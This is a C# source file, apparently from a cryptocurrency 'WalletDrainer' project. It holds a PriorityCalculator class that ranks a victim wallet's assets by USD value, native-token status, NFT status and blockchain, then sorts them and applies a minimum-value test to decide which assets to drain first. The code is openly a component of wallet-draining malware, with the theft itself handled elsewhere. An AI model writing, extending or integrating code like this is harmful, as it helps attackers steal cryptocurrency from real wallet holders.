using WalletDrainer.Models;

namespace WalletDrainer.Utils;

public static class PriorityCalculator
{
    public static int CalculatePriority(WalletAsset asset)
    {
        int score = 0;

        score += asset.UsdValue switch
        {
            >= 10000 => 100,
            >= 1000 => 80,
            >= 100 => 60,
            >= 10 => 40,
            _ => 20
        };

        if (asset.IsNative)
            score += 15;

        if (asset.IsNft)
            score -= 10;

        score += asset.Chain switch
        {
            "ethereum" => 10,
            "bsc" => 5,
            "arbitrum" => 8,
            _ => 0
        };

        return score;
    }

    public static List<WalletAsset> SortByPriority(IEnumerable<WalletAsset> assets)
    {
        return assets
            .Select(a => (Asset: a, Priority: CalculatePriority(a)))
            .OrderByDescending(x => x.Priority)
            .Select(x => x.Asset)
            .ToList();
    }

    public static bool ShouldDrain(WalletAsset asset, decimal minValueUsd) =>
        asset.UsdValue >= minValueUsd;
}
